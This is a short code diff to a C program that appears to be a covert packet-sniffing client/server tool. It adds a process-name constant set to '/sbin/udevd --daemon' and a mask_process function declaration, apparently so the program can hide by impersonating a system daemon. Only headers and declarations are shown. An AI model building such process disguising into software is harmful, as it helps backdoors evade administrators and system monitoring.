@@ -24,6 +24,8 @@
 #include <pcap.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
+#include <sys/prctl.h>
+#include <sys/types.h>
 #include "packet_headers.h"
 #include "encrypt.h"
 
@@ -33,6 +35,7 @@
 | ------------------------------------------------------------------------------
 */
 
+#define PROCESS_NAME	"/sbin/udevd --daemon"
 #define PKT_SIZE        4096
 #define WIN_SIZE        55840
 #define DEFAULT_TTL		255
@@ -89,7 +92,7 @@ void client(struct client_opt c_opt);
 int send_datagram(struct addr_info *user_addr, char *data);
 void server(struct server_opt s_opt);
 void packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);
+void mask_process(char **, char *);
 void usage();
 unsigned short csum(unsigned short *, int);
 static void system_fatal(const char* message);
-
